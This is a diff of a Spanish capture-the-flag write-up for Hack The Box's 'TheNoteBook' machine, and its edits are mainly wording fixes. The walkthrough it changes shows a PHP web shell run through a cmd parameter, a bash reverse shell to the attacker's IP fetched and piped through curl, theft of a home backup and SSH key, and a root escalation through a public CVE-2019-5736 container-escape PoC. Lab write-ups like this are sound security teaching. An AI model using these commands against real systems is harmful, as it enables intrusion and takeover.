@@ -141,7 +141,7 @@ Para empezar, hice un escaneo con la herramienta **Nmap** para encontrar los pue
   <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/TheNoteBook/intrusion/upload2.png">
   </p>
 
-  Yo creare un archivo **php** el cuan tenga el siguiente contenido.
+  Yo creare un archivo **php** el cual tiene el siguiente contenido.
 
   ```python
 <?php
@@ -163,25 +163,25 @@ Para empezar, hice un escaneo con la herramienta **Nmap** para encontrar los pue
   <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/TheNoteBook/intrusion/webC.png">
   </p>
 
-  Así que recordando que el **php** recibe un parámetro **cmd** por **GET** y lo ejecuta con **system** que le paso a cmd la intruccion de ejecutar **whoami** y como se aprecia en la imagen la web me responde con un **www-data**.
+  Así que recordando que el **php** recibe un parámetro **cmd** por **GET** y lo ejecuta con **system**, le paso a la variable cmd el comando **whoami** y como se aprecia en la imagen la web me responde con un **www-data**.
 
   <p align="center">
   <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/TheNoteBook/intrusion/webW.png">
   </p>
 
- Viendo que tengo capacidad de ejecutar comando en la maquina buscare la forma de acceder al equipo, aprovechando que el equipo tiene **curl** y aprovechando el servicio http que ya tenia montado creare un archivo bash con el siguiente contenido.
+ Viendo que tengo capacidad de ejecutar comando en la maquina buscare la forma de acceder al equipo para esto usare **curl** y aprovechando el servicio http que ya tenia montado creare un archivo bash con el siguiente contenido.
 
 
  ```bash
   #!/bin/bash
   bash -i >& /dev/tcp/10.10.15.125/443 0>&1
  ```
- Ya teniendo el archivo creado y puesto en escucha por el puerto 443 con **nc** en la web ingresare lo siguiente.
+ Ya teniendo el archivo creado y yo habiéndome puesto en escucha por el puerto 443 con **nc** en la web ingresare lo siguiente.
 
  ```bash
 10.10.10.230/[File Name].php?cmd=curl http://10.10.15.125:7070/winshell.sh|bash
  ```
- Y al ingresar esto se puede ver como en mi consola la web hace la peticion a **"winsehll.sh"** y me otorga la shell al interpretar el contenido del archivo y pipearlo con **bash**
+ Y al ingresar esto se puede ver como en mi consola la web hace la petición a **"winshell.sh"** y me otorga la shell como www-data al interpretar el contenido del archivo y pipearlo con **bash**
 
  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/TheNoteBook/intrusion/shell.png">
@@ -189,7 +189,7 @@ Para empezar, hice un escaneo con la herramienta **Nmap** para encontrar los pue
 
 ## Privilege escalation - Noah
 
- Enumerando el sistema puedo ver que el la ruta **/var/backups** existe un recurso llamado **home.tar.gz** el cual pude transferir a mi equipo cifrandolo en base64.
+ Enumerando el sistema puedo ver que el la ruta **/var/backups** existe un recurso llamado **home.tar.gz** el cual pude transferir a mi equipo cifrandolo en **base64**.
 
  ```
  #Victim Machin
@@ -200,7 +200,7 @@ Para empezar, hice un escaneo con la herramienta **Nmap** para encontrar los pue
 
  ```
 
- Ya en mi equipo comparo el md5 de los archivos y veo que son los mismo asegurando así la integridad el archivo.
+ Ya en mi equipo comparo el **md5** de los archivos y veo que son los mismo asegurando así la integridad el archivo.
 
  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/TheNoteBook/intrusion/home.png">
@@ -213,7 +213,7 @@ Para empezar, hice un escaneo con la herramienta **Nmap** para encontrar los pue
  </p>
 
 
- Viendo que cuento con unas credenciales para **ssh** puedo usarlas para entrar como el usuario **noah**.
+ Viendo que cuento con unas credenciales para **ssh** puedo usarlas para entrar como el usuario **noah** sin proporcionar contraseña ya que el archivo de identidad **id_rsa** no esta protegido con contraseña.
 
  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/TheNoteBook/intrusion/ssh.png">
@@ -237,11 +237,11 @@ User noah may run the following commands on thenotebook:
   (ALL) NOPASSWD: /usr/bin/docker exec -it webapp-dev01*
 ```
 
-Algo que se puede hacer es ejecutar ```sudo /usr/bin/docker exec -it webapp-dev01 bash``` el cual nos otorgara una shell en el conteenedor existente pero dentro de este contenedor no existe nada con la cual podamos escalar privilegios.
+Algo que se puede hacer es ejecutar ```sudo /usr/bin/docker exec -it webapp-dev01 bash``` el cual nos otorgara una shell en el contenedor existente pero dentro de este contenedor no existe nada con el cual podamos escalar privilegios.
 
 Viendo la versión de **docker** y buscando vulnerabilidades existentes podemos llegar a una con el CVE: **CVE-2019-5736**.
 
-Existe un **[PoC](https://github.com/Frichetten/CVE-2019-5736-PoC)** en github el cual use para poder escapar del contenedor.
+Existe un **[PoC](https://github.com/Frichetten/CVE-2019-5736-PoC)** en github el cual use para poder ejecutar comando como root.
 
 Para poder ejecutar el **PoC** es necesario clonar el repositorio y compilar el **main.go** pero antes modificar el **PAYLOAD**.
 
@@ -252,20 +252,20 @@ Para poder ejecutar el **PoC** es necesario clonar el repositorio y compilar el 
 En este caso yo pondré que le otorgue permisos **SUID** a la **/bin/bash**.
 
 <p align="center">
-<img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/TheNoteBook/intrusion/Poc1.png">
+<img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/TheNoteBook/intrusion/PocP1.png">
 </p>
 
 
-Ya teniendo esto compilo el main con ```go build -ldflag "-x -w" main.go```. Ya teniendo el binario compilado lo tenemos que pasar a el contenedor y para esto entrare con una bash al contenedor y con wget me descargare el binario pero previamente montare un servidor http con python.
+Ya teniendo esto compilo el main con **```"go build -ldflag "-x -w" main.g"```**. Ya teniendo el binario compilado lo tenemos que pasar a el contenedor y para esto entrare con una **bash** al contenedor y con **wget** me descargare el binario pero previamente montare un servidor **http** con **python**.
 
 <p align="center">
-<img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/TheNoteBook/intrusion/Poc2.png">
+<img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/TheNoteBook/intrusion/PocP2.png">
 </p>
 
-Una vez que ya transferir el binario tengo que ejecutarlo y entrar una vez mas por **ssh** para en otra ventana aparte para ejecutar el el comando con sudo pero ahora ingresando una **/bin/sh**.
+Una vez que ya transferir el binario tengo que ejecutarlo y entrar una vez mas por **ssh** para que en otra ventana aparte ejecutar el comando con **sudo** pero ahora ingresando una **/bin/sh** y no una **bash**.
 
 <p align="center">
-<img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/TheNoteBook/intrusion/Poc3.png">
+<img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/TheNoteBook/intrusion/PocP3.png">
 </p>
 
 Y como se puede observar podemos ejecutar comando como root y de este modo otorgándole permisos SUID a la **/bin/bash** y así obteniendo una shell como **root**
